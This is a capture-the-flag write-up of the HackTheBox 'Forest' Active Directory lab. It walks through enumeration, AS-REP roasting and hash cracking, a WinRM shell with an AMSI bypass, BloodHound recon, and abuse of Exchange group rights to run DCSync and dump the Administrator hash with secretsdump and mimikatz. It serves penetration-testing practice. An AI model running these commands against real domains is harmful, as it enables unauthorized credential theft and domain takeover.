# Introduction

Hey there and welcome to my blog post where i'll be doing an in-depth walkthrough of the `Forest` machine on HTB. This is an easy, beginner friendly active directory machine that can help you practice and exploit attacks such as ASREP-Roasting & DCSync attack. I've played this machine a couple of times before and as I was helping my stuck friend, I figured I could make some small notes and share with the community.

# TL;DR ?

# Enumeration

I started by running an portscan to determine what ports are open and services running behind them. In my case, I used [rustscan](https://github.com/RustScan/RustScan) , a modern port scanner made to be fast and efficient. (*It can scan all 65k ports in 3 seconds.😎* )

From the nmap results, I was able identify that this target could potentially be a `Domain Controller`.

> *A domain controller is a Windows server that has Active Directory Domain Services (AD DS) installed and has been promoted to a domain controller in the forest.


**Thought Process:**

- `Port 88/tcp (Kerberos)`: Kerberos is central to authentication in Active Directory environments, typically run on domain controllers.
- `Port 139/tcp and 445/tcp (NetBIOS/MSDS)`: These ports are essential for SMB communications, which are used for network file sharing and are common on domain controllers for managing directory services.
- `Port 389/tcp (LDAP)`: Indicates that the machine is running Microsoft Windows Active Directory LDAP, which is necessary for accessing and managing directory services information.
- `Port 464/tcp (kpasswd5?)`: This port is typically associated with Kerberos password change operations, reinforcing the role of this server in managing authentication.
- `Port 593/tcp and 49674/tcp (ncacn_http)`: These ports indicate that RPC over HTTP is being used, a method often employed by domain controllers to facilitate operations across network boundaries.
- `Port 636/tcp (LDAPS)`: Secure LDAP service, which is an encrypted version of LDAP running over SSL/TLS, common on domain controllers for secure directory access.
- `Ports 5985/tcp and 47001/tcp (HTTP)`: Indicate that Windows Remote Management (WinRM) and other HTTP services are active, commonly used for server management and operational tasks.
- From the smb-os-discovery information, we learn that the target is a `Windows Server 2016 Standard` with a FQDN `FOREST.htb.local`

As a pentester, enumerating users and groups in an Active Directory environment via services like SMB and LDAP  provides interesting  insights into the structure and security posture of the network. Here’s why focusing on users and groups during enumeration is particularly important:

- Enumerating users and groups helps identify accounts with elevated privileges, such as members of the Domain Admins, Enterprise Admins, or other administrative groups. 
- By examining group memberships and user account properties, you can understand the access controls implemented within the environment. 
- Enumerating SMB and LDAP can reveal misconfigurations in user and group settings, such as excessively permissive group memberships, unprotected sensitive accounts, or misconfigured access permissions. eg *Service accounts often have permissions across multiple systems and can be particularly vulnerable to abuse.* 

## SMB Enumeration

### Nmap

Using nmap scripts, you can gather information from the target server.

```bash
nmap --script "safe or smb-enum-*" -p 445 IP
```

eg

```bash
➜  nmap --script "safe or smb-enum-*" -p 445 10.10.10.161

### Enum4Linux

To check if you can get extra information you can use `enum4linux`.

> *enum4linux is a versatile tool used for enumerating information from Windows and Samba systems, utilizing a combination of different SMB, RPC, and NetBIOS enumeration techniques to gather information. It uses SMB commands, calls to the nmblookup tool for NetBIOS names, and various other techniques including querying the Windows Registry via RPC.*

Output from this tools is preety similar to the nmap output, except that we get extra information that might be potentially useful for us such as User and Group RID's. Atleast you also get a neater summary. 😎


### rpcclient 

> `rpcclient` *is a command-line utility, part of the Samba suite, used to interact with Windows servers and clients via the Remote Procedure Call (RPC) protocol over SMB (Server Message Block). This tool provides a way to execute a variety of administrative tasks on a remote computer running Windows.*


Lets try explore the RPC services of the remote server without providing authentication details.

`rpcclient -U "" -N 10.10.10.161`

> *Allowing anonymous connections over RPC can be a significant security risk. It could allow unauthorized users to access sensitive functions or data on the server, depending on the permissions granted to anonymous connections.*

The users and groups identifed are preety similar to the output we found earlier:

Other useful commands you could explore:

```bash
enumdomusers
querydispinfo
enumdomgroups
enumdomains
samquerysecobj
getdompwinfo
enumprivs
```

## LDAP Enumeration

### NMAP

Using nmap's default scripts, we can try discovering, enumerating, and gathering information about LDAP services

```bash
nmap -n -sV --script "ldap* and not brute" 10.10.10.161
```

### Windapsearch

> *Python script to enumerate users, groups and computers from a Windows domain through LDAP queries*

```bash
# Enumerate all AD Users
./windapsearch.py -d htb.local --dc-ip 10.10.10.161 -U

# Enumerate all AD Groups
./windapsearch.py -d htb.local --dc-ip 10.10.10.161 -G

# Enumerate all AD Computers
./windapsearch.py -d htb.local --dc-ip 10.10.10.161 -C 

# Enumerate Domain Functionality level. Possible through anonymous bind
./windapsearch.py -d htb.local --dc-ip 10.10.10.161 --functionality
```

# Initial Access

## ASREP-ROAST Attack

From the results we see `[+] htb.local\svc-alfresco account vulnerable to asreproast attack` . 

This appeared to me as a [Service Account](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-service-accounts) (I guess because it starts with `svc_` ... *Common naming conventions* 😅)

> _A service account is a user account that's created explicitly to provide a security context for services that are running on Windows Server operating systems. The security context determines the service's ability to access local and network resources._
> ~Source: [Learn Microsoft](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-service-accounts)

Anyway, since the user is asreproastable, let me recap a little on this attack before proceeding further. AS-REP roasting is basically a type of attack in Active Directory environments that exploits accounts configured to not require `Kerberos pre-authentication`.

`Kerberos pre-authentication` is a security feature designed to protect against offline password-guessing attacks. When enabled (_which is the default setting in Active Directory_), the user must prove their identity before the `Key Distribution Center (KDC)` issues a `Ticket Granting Ticket (TGT)`. This is typically done by sending a timestamp encrypted with the user's password hash. For visual learners:

If an account is configured to not require Kerberos pre-authentication ("`Do not require Kerberos preauthentication`" option in the user account properties), it becomes vulnerable to `AS-REP roasting`. 

### 1. NetExec Method

Having that in mind, we can request authentication data for `svc-alfresco` without supplying any credentials using [NetExec's](https://www.netexec.wiki/ldap-protocol/asreproast) ldap asreproast feature:

```

From the snipete above, you can see that the KDC returns an encrypted part of the AS-REP that contains the session key for the TGT. You can then attempt to crack this offline using `hashcat`.

If you care to learn more about the structure of the hash, here's a quick breakdown:

- `$krb5asrep$`: _This indicates the type of hash, specifically a hash from a Kerberos 5 AS-REP message_.
- `23`: _This is the encryption type used in the Kerberos ticket. The number **23** typically represents **RC4-HMAC** encryption._
- `svc-alfresco@HTB.LOCAL`: _This is the principal name, which in Kerberos terms is the identifier of the service account. In this case, it is a service account named svc-alfresco in the HTB.LOCAL domain._
- `49b0a9c32cff239b7a9800c26e5bf3c6`: _This is the client's nonce/salt used in the encryption process._
- The long string following the first colon: This is the encrypted part of the Kerberos response. It is encrypted using the key derived from the password of the account svc-alfresco@HTB.LOCAL.


### 2. GetNPUsers Method

> [GetNPUsers](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py) *attempts to request Ticket Granting Service (TGS) tickets for users that have the Kerberos pre-authentication disabled.*

Simply run the following command aganist the list of identified users:

```bash
impacket-GetNPUsers htb.local/ -request -usersfile users.txt -format hashcat -dc-ip 10.10.10.161
```

eg:

```bash
➜  impacket-GetNPUsers htb.local/ -request -usersfile users.txt -format hashcat -dc-ip 10.10.10.161

## Hash cracking

### Hashcat


Moving on to hashcat, you need to identify the right mode to use in cracking the hash. Simply run the following command:

```bash
➜  hashcat --help | grep -i kerberos
  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
```

Here you want to focus on the last option on the list `18200`, which as you can see is for the AS-REP type. Proceed to crack as follows:

```bash
➜  hashcat -m 18200 TGT.txt ~/Desktop/rockyou.txt

## WinRM Access

We now have the user's password: `svc-alfresco:s3rvice` and the possibilities could be endless at this point 😎.

Using [NetExec's](https://www.netexec.wiki/winrm-protocol/authentication) winrm feature, we can test if the creds actually work. (*Expected result should have `Pwn3d`*)

```bash
➜  Forest nxc winrm 10.10.10.161 -u svc-alfresco -p s3rvice 
WINRM       10.10.10.161    5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)

```

Confirmed, proceed to get a shell using `Evil-WinRM` and grab your local flag from the Desktop:🚩


```bash
➜  evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice' -s '~/Desktop/CTF/HTB/Forest' -e '~/Desktop/CTF/HTB/Forest' -l

## Domain Recon

### PowerView

On Evil-Winrm, you can use the `menu` option to view other things you can do on your shell session. In my case, I wish to upload [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) , on the target machine for further enumeration.

> _PowerView is a PowerShell tool to gain network situational awareness on Windows domains. It also implements various useful metafunctions, including some custom-written user-hunting functions which will identify where on the network specific users are logged into. It can also check which machines on the domain the current user has local administrator access on. Several functions for the enumeration and abuse of domain trusts also exist._ 
> ~ Source: _[PowerSploit Documentation](https://powersploit.readthedocs.io/en/latest/Recon/)_

But before I uploaded my script, i can leverage on the `Bypass-AMSI` module to avoid any issues while uploading powershell script or Invoking them on the target system.

![image](https://gist.github.com/assets/58165365/45d4bef0-be4c-4587-9f75-5f979d8e43a5)

As that is successful, I proceeded to Import the PowerView module. When you run `menu` again, you will now access more modules that we'll explore shortly. 

![image](https://gist.github.com/assets/58165365/20228a80-342a-47ed-ae83-328f88d27061)

An exhaustive list of functions can be found here:

<iframe src="https://powersploit.readthedocs.io/en/latest/Recon/" width="100%" height="600px" style="border:none;"></iframe>


I've also done a [PowerView Walkthrough](https://05t3.github.io/posts/PowerView-Walkthrough/) blog before, so be sure to check it out 😎.


We can get information about the domain as follows:

```powershell
2024-05-14 15:27:54 +0300: *Evil-WinRM* PS C:\Users\svc-alfresco\Documents > Get-NetDomain
2024-05-14 15:27:55 +0300: 

Forest                  : htb.local
DomainControllers       : {FOREST.htb.local}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : FOREST.htb.local
RidRoleOwner            : FOREST.htb.local
InfrastructureRoleOwner : FOREST.htb.local
Name                    : htb.local
```

If you want to get all the groups a user is a member of


```powershell
2024-05-14 15:31:53 +0300: *Evil-WinRM* PS C:\Users\svc-alfresco\Documents > Get-DomainGroup -MemberIdentity svc-alfresco | select samaccountname
2024-05-14 15:31:57 +0300: 
samaccountname
--------------
Service Accounts
Privileged IT Accounts
Domain Users
```

To check if the current user context has local administrator access


```powershell
2024-05-14 15:32:24 +0300: *Evil-WinRM* PS C:\Users\svc-alfresco\Documents > Invoke-CheckLocalAdminAccess
2024-05-14 15:32:26 +0300: 
ComputerName IsAdmin
------------ -------
localhost      False
```

To check if the current user has administrative access to the local (or a remote) machine


```powershell
2024-05-14 15:32:37 +0300: *Evil-WinRM* PS C:\Users\svc-alfresco\Documents > Test-AdminAccess
2024-05-14 15:32:48 +0300: 
ComputerName IsAdmin
------------ -------
localhost      False
```

### BloodHound

At this point, we can go on and on running different commands. I decided to switch to `BloodHound` for visualizing the domain better in terms of graphical representation and analytical capabilities. 

> _[BloodHound](https://bloodhound.readthedocs.io/en/latest/) uses graph theory to reveal hidden and often unintended relationships within an Active Directory (AD) environment._ 


In order to visualize this info, you need to upload an ingestor on the target, in this case `SharpHound`. You can get the `.exe` or `.ps1` from the official [repo](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)

Simply run:

```bash
.\SharpHound.exe --CollectionMethods All --OutputPrefix "Forest" --Domain htb.local
```

where:

- `--CollectionMethods All` - _This tells SharpHound what kind of data you want to collect. Other methods include: DCOnly, ComputerOnly, Session, LoggedOn._ (_[More Info](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html)_)
- `--OutputPrefix "Forest"` - *This is basically the syntax to prepend in my loot file. (NOT NECESSARY)*
- `--Domain htb.local` - *Specify domain*

```bash
2024-05-14 12:28:07 +0300: *Evil-WinRM* PS C:\Users\svc-alfresco\Documents > upload /home/oste/Desktop/CTF/HTB/Forest/SharpHound.exe .

Using `Evil-WinRM's` download module, we can get the loot file to my local machine for analysis.

```powershell

```

Assuming you are using Kali Linux as your attack machine, you should already have BloodHound & Neo4j installed. So simply run:

![image](https://gist.github.com/assets/58165365/539c9909-a4fe-4651-b62d-83d38f2602d3)

Once the bloodhound GUI launches, on the top right, select **Upload Data.** and select your ZIP file

![image](https://gist.github.com/assets/58165365/8791989c-128d-4d2a-acd2-adbe43a8ed5e)


Once the data is ingested, on the top left, proceed to search for the `svc-alfresco` principal. Then right click on the user and mark the user as owned.

Exploring further, we can start getting more info about the domain using simple queries. For instance we can use the Query highlighted

# Privilege Escalation

Here, we see the svc-alfresco user is part of the `Service Accounts`, which is also a member of the `Privileged Accounts` which is a member of the `Account Operators account`.



> The Account Operators group grants limited account creation privileges to a user. Members of this group can create and modify most types of accounts, including accounts for users, Local groups, and Global groups. Group members can log in locally to domain controllers.
> 
> Members of the Account Operators group can't manage the Administrator user account, the user accounts of administrators, or the [Administrators](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#administrators), [Server Operators](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators), [Account Operators](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators), [Backup Operators](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#backup-operators), or [Print Operators](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#print-operators) groups. Members of this group can't modify user rights.

~ _Source: [Account Operators - **Microsoft Learn**](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators)_


`ACCOUNT OPERATORS@HTB.LOCAL` has `GenericAll` privileges to the group `EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL`.

**Attack Path 1 - ABUSE:**


![image](https://gist.github.com/assets/58165365/9cee8274-f594-4a65-b2f7-cdb93bb422f1)

The members of the group `EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL` have permissions to modify the DACL (Discretionary Access Control List) on the domain HTB.LOCAL.

With write access to the target object's DACL, you can grant yourself any privilege you want on the object.

**Attack Path 2 - ABUSE:**

----

I did some little digging on the `EXCHANGE WINDOWS PERMISSION` group and here's some interesting stuff I thought I could add to this blog.

- Exchange has high privileges in the Active Directory domain.
- The Exchange Windows Permissions group has WriteDacl access on the Domain object in Active Directory, which enables any member of this group to modify the domain privileges, among which is the privilege to perform DCSync operations. Users or computers with this privilege can perform synchronization operations that are normally used by Domain Controllers to replicate, which allows attackers to synchronize all the hashed passwords of users in the Active Directory.
- Exchange Permissions in Active Directory 
  - `Organization Management` *has Full Control (“GenericAll”) rights at the domain root.*
  - `Exchange Trusted Subsystem` *has Full Control (“GenericAll”) rights at the domain root.*
  - `Exchange Recipient Administrators` *has Full Control (“GenericAll”) rights at the domain root*.
  - `Exchange Windows Permissions` *has Modify Permissions (“WriteDACL”) rights at the domain root.*

Now lets get straight into abusing this privileges. First: We need to:

- Abuse the `Account Operator` privileges to create a user.
- Add user to the `Exchange Windows Permissions` & `Remote Management Users` groups. 
- Leverage on previosuly uploaded PowerView script to grant DCSync privileges to the newly created account.

**What next?**

So abusing the DCSync rights in an Active Directory (AD) environment allows us to simulate the behavior of a Domain Controller (DC) and request sensitive account information from the DC or other DC's using the Directory Replication Service (DRS) Remote Protocol. This capability is extremely powerful for extracting domain credentials, including NTLM hashes and Kerberos tickets, which can abuse further for lateral movement or elevating privileges within the domain. We can do so using two techniques:

## Dumping Admin Hash

### 1. Using secretsdump


We can initiate a DCSync attack on our local attack machine using [Impacket's](https://github.com/fortra/impacket) `secretsdump` script as shown:

```bash
➜  impacket-secretsdump htb.local/pwned:'Pwn3d!!'@10.10.10.161

```


Here, we're mostly intrested in the Administrator hash.


### 2. Using Mimikatz

> If you're using kali, grab yourself the mimikatz binary from:
>```bash
> /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe
> /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
>```


While logged in as the created user, bypassed AMSI & uploaded mimikatz on the target, simply execute the following to dump the Administrator NTLM hash.


```powershell
➜  evil-winrm -i 10.10.10.161 -u pwned -p 'Pwn3d!!' -s '/home/oste/Desktop/CTF/HTB/Forest' -e '/home/oste/Desktop/CTF/HTB/Forest' -l '/home/oste/Desktop/CTF/HTB/Forest'
